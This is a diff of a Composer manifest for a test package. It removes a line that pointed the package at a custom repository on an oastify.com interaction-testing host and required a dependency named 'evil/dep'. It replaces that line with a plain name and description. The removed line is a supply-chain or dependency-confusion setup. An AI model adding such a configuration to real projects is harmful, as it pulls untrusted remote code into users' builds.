@@ -1,1 +1,4 @@
-{"name":"hardik0013/pk-tp-test","description":"test","repositories":[{"type":"composer","url":"https://pkgrepo.6horwa6qy2a5m40jr8d78dzrlir9sx77s9ay.oastify.com"}],"require":{"evil/dep":"*"}}
+{
+  "name": "hardik0013/pk-tp-test",
+  "description": "Test package"
+}
